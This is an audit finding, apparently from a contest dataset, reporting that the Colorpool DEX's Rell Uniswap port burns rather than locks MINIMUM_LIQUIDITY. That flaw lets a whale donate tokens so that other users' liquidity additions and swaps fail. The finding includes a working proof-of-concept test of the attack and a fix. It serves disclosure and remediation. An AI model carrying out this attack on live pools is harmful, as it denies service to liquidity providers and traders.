# [M] Whale can DoS Uniswap pools

## Summary
Severity: Medium
Reporter: 0xb0k0, also found by trachev, 0xlookman, 0xluk3, Joshuajee, 0xabdullah, CAUsr, Josh4324, Zany-Bonzy, 0xpinkman, 0xAlexS
Contest weight: 0.4430
Dataset id: 4941
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
```rell
function mint(current_pair: pair_manager, to: account): big_integer {
    var liquidity: big_integer = 0;
    val (reserve0, reserve1, _) = get_reserves(current_pair);
    val balance0 = get_asset_balance(current_pair.treasury, current_pair.asset0);
    val balance1 = get_asset_balance(current_pair.treasury, current_pair.asset1);
    val amount0 = balance0 - reserve0;
    val amount1 = balance1 - reserve1;
    _mint_fee(current_pair, reserve0, reserve1);
    val total_supply = current_pair.lp_asset.total_supply;
    if (total_supply == 0) {
        liquidity = sqrt_func(amount0 * amount1) - app_meta_uniswap.MINIMUM_LIQUIDITY;
        // permanently lock the first MINIMUM_LIQUIDITY tokens
        assets.Unsafe.mint(current_pair.treasury, current_pair.lp_asset, app_meta_uniswap.MINIMUM_LIQUIDITY);
        // <<<
        assets.Unsafe.burn(current_pair.treasury, current_pair.lp_asset, app_meta_uniswap.MINIMUM_LIQUIDITY);
        // <<< @audit - liquidity is not locked as burning will reduce the total supply
    } else {
        liquidity = min_func(amount0 * total_supply / reserve0, amount1 * total_supply / reserve1);
    }
    require(liquidity > 0, "UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED");
    assets.Unsafe.mint(to, current_pair.lp_asset, liquidity);
    update_func(current_pair, balance0, balance1, reserve0, reserve1);
    if (app_meta_uniswap.fee_on) {
        val k_last = current_pair.reserve0 * current_pair.reserve1; // reserve0 and reserve1 are up-to-date
        update current_pair ( .k_last = k_last );
    }
    return liquidity;
}
```

It seems that the Colorpool DEX does not lock the MINIMUM_LIQUIDITY on the first add_liquidtiy call, which opens up the possibility of a whale to mint 1 share and donate large amounts of tokens to the treasury, effectively preventing other LP providers from adding liquidity and making it unfavourable for swaps.

Impact Explanation:  
1. Users will be DoSed from adding liquidity if they don't provide a more significant amount than what the whale has donated.  
2. The whale will heavily influence the swaps as he controls the entire LP.  
3. If the whale removes his share of liquidity, swaps will start reverting due to 0 divisions.

## Proof of Concept
Add the following test to the uniswap_rell_test.rell file and run it with chr test --tests=test_whale_can_dos_uniswap_attack:
```rell
function test_whale_can_dos_attack() {
    test_init_success();
    deploy_token_script("USDC", "USDC", 6, "http://icon.com");
    deploy_token_script("BTC", "BTC", 8, "http://icon.com");
    create_user();
    val bob_account = get_account_by_pubkey(bob.hash());
    val alice_account = get_account_by_pubkey(alice.hash());
    val asset_usdc = get_asset_by_symbol("USDC");
    val asset_btc = get_asset_by_symbol("BTC");
    admin_mint_for_user(bob_account, asset_usdc, 200000000000L);
    admin_mint_for_user(bob_account, asset_btc, 200000000L);
    admin_mint_for_user(alice_account, asset_usdc, 20000000000L);
    admin_mint_for_user(alice_account, asset_btc, 50000000L);
    // Bob mints exactly 1 LP
    add_liquidity_script(
        asset_usdc,
        asset_btc,
        1001,
        1001,
        1001,
        1001,
        100000000000,
        bob_account,
        bob_kp,
        bob
    );
    val pair = get_force_pair(asset_usdc, asset_btc);
    // Bob now donates large amounts of BTC and USDC to the pair
    rell.test.tx()
        .nop()
        .op(ft_auth_operation_for(bob))
        .op(
            transfer(
                pair.treasury.id,
                asset_btc.id,
                100000000L
            )
        )
        .sign(bob_kp)
        .run();
    rell.test.tx()
        .nop()
        .op(ft_auth_operation_for(bob))
        .op(
            transfer(
                pair.treasury.id,
                asset_usdc.id,
                100000000000L
            )
        )
        .sign(bob_kp)
        .run();
    // Bob syncs the pair
    rell.test.tx().nop().op(ft_auth_operation_for(bob)).op(sync(pair)).sign(bob_kp).run();
    // Alice can't add liquidity as it will always try to mint 0
    val e1 = rell.test.tx()
        .nop()
        .op(ft_auth_operation_for(alice))
        .op(
            add_liquidity(
                asset_usdc.name,
                asset_btc.name,
                10000000000L,
                50000000L,
                0,
                0,
                100000000000,
                alice_account.id.to_hex()
            )
        )
        .sign(alice_kp)
        .run_must_fail();
    assert_true(e1.message.contains("UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED"));
    // If Bob removes his LP, swaps will start failing as there will be 0 liquidity
    remove_liquidity_script(
        asset_usdc,
        asset_btc,
        1,
        0,
        0,
        100000000000,
        bob_account,
        bob_kp,
        bob
    );
    var path: list<name> = [asset_usdc.name, asset_btc.name];
    val e2 = rell.test.tx()
        .nop()
        .op(ft_auth_operation_for(alice))
        .op(swap_exact_tokens_for_tokens(10000000000L, 0, path, alice_account.id.to_hex(), 100000000000))
        .sign(alice_kp)
        .run_must_fail();
    assert_true(e2.message.contains("UniswapV2Library: INSUFFICIENT_LIQUIDITY"));
}
```

## Recommendation
Mint the MINIMUM_LIQUIDITY to the treasury lock account without burning it.
